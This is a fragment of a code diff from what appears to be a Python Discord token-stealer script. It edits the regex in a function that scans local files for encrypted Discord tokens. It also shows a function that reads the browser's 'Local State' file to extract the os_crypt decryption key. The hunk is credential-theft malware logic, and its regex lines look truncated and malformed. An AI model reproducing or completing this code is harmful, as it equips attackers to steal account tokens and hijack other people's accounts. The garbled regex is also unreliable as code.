@@ -83,8 +83,8 @@ def gettokens(path):
         try:
             with open(f"{path}{file}", "r", errors="ignore") as f:
                 for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*
-
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
+                        
 def getkey(path):
     with open(path + f"\\Local State", "r") as file:
         key = json.loads(file.read())['os_crypt']['encrypted_key']
